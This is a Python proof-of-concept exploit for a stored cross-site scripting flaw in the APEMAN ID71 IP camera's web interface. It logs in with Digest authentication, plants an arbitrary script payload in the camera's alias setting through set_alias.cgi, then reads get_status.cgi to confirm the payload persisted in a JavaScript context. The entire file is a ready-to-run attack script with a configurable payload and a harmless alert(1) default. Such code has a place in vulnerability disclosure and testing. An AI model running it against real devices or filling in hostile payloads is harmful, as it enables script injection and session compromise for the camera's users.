"""
APEMAN ID71 Stored XSS PoC (concise)

Authenticates via HTTP Digest, sets alias with payload (also sends
loginuse/loginpas), then verifies via get_status.cgi.

Usage:
  python apeman_id71_xss_poc.py --host 192.168.1.151 --port 53370 \
    --username admin --password <PASSWORD> --payload '<script>alert(1)</script>'
"""

from __future__ import annotations

import argparse
import re
import sys
from typing import Optional

try:
    import requests
    from requests.auth import HTTPDigestAuth
except Exception as import_error:  # pragma: no cover
    sys.stderr.write(
        "[!] Missing dependency: requests. Install with `pip install requests`\n"
    )
    raise


def build_base_url(scheme: str, host: str, port: Optional[int]) -> str:
    if port is None:
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"


def set_alias(
    session: requests.Session,
    base_url: str,
    alias_payload: str,
    next_url: str,
    loginuse: Optional[str] = None,
    loginpas: Optional[str] = None,
    timeout_seconds: int = 10,
) -> requests.Response:
    endpoint = f"{base_url}/set_alias.cgi"
    params = {
        "alias": alias_payload,
        "next_url": next_url,
    }
    # Some firmware variants expect these as query params in addition to Digest
    if loginuse is not None:
        params["loginuse"] = loginuse
    if loginpas is not None:
        params["loginpas"] = loginpas

    response = session.get(endpoint, params=params, timeout=timeout_seconds)
    return response


def get_status(session: requests.Session, base_url: str, timeout_seconds: int = 10) -> str:
    endpoint = f"{base_url}/get_status.cgi"
    response = session.get(endpoint, timeout=timeout_seconds)
    response.raise_for_status()
    return response.text


def extract_alias_from_status(body: str) -> Optional[str]:
    # Matches: var alias="..."; capturing the inner content lazily.
    match = re.search(r"var\s+alias\s*=\s*\"([\s\S]*?)\"\s*;", body)
    if match:
        return match.group(1)
    return None


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "APEMAN ID71 Stored XSS PoC: sets a malicious alias and verifies via get_status.cgi"
        )
    )
    parser.add_argument("--host", required=True, help="Camera host/IP")
    parser.add_argument("--port", type=int, default=80, help="Camera TCP port (default: 80)")
    parser.add_argument(
        "--scheme",
        choices=["http", "https"],
        default="http",
        help="URL scheme (default: http)",
    )
    parser.add_argument("--username", required=True, help="Username for Digest auth")
    parser.add_argument("--password", required=True, help="Password for Digest auth")
    parser.add_argument(
        "--payload",
        default="<script>alert(1)</script>",
        help="XSS payload to store in alias (default: <script>alert(1)</script>)",
    )
    parser.add_argument(
        "--next-url",
        default="alias.htm",
        help="Value for next_url parameter when setting alias (default: alias.htm)",
    )
    parser.add_argument(
        "--loginuse",
        default=None,
        help="Optional loginuse query param (default: --username)",
    )
    parser.add_argument(
        "--loginpas",
        default=None,
        help="Optional loginpas query param (default: --password)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    # No TLS flags for simplicity; relies on requests defaults.

    args = parser.parse_args(argv)

    base_url = build_base_url(args.scheme, args.host, args.port)

    session = requests.Session()
    session.auth = HTTPDigestAuth(args.username, args.password)

    # Derive default query params if not explicitly provided
    derived_loginuse = args.loginuse if args.loginuse is not None else args.username
    derived_loginpas = args.loginpas if args.loginpas is not None else args.password
    final_payload = args.payload

    try:
        print(f"[+] Setting alias to payload via {base_url}/set_alias.cgi ...")
        set_response = set_alias(
            session=session,
            base_url=base_url,
            alias_payload=final_payload,
            next_url=args.next_url,
            loginuse=derived_loginuse,
            loginpas=derived_loginpas,
            timeout_seconds=args.timeout,
        )
        if set_response.status_code >= 400:
            print(
                f"[!] Failed to set alias. HTTP {set_response.status_code}: {set_response.text[:200]}"
            )
            return 2

        print(f"[+] Fetching status from {base_url}/get_status.cgi ...")
        status_body = get_status(session=session, base_url=base_url, timeout_seconds=args.timeout)
        extracted_alias = extract_alias_from_status(status_body)
        if extracted_alias is None:
            print("[!] Could not locate alias variable in response. Raw excerpt:")
            print(status_body[:400])
            return 3

        print(f"[+] Alias extracted from response: {extracted_alias}")
        if final_payload in extracted_alias:
            print("[+] SUCCESS: Payload persisted and is reflected into JavaScript context.")
            return 0
        else:
            # Heuristic: truncation commonly results in extracted_alias being a prefix
            if final_payload.startswith(extracted_alias):
                print(
                    "[!] WARNING: Alias appears truncated in storage. Likely server-side length limit."
                )
            else:
                print("[!] WARNING: Alias present but does not match the provided payload.")
            return 4

    except requests.exceptions.RequestException as http_error:
        print(f"[!] HTTP error: {http_error}")
        return 5
    except Exception as unexpected_error:  # pragma: no cover
        print(f"[!] Unexpected error: {unexpected_error}")
        return 6


if __name__ == "__main__":
    sys.exit(main())


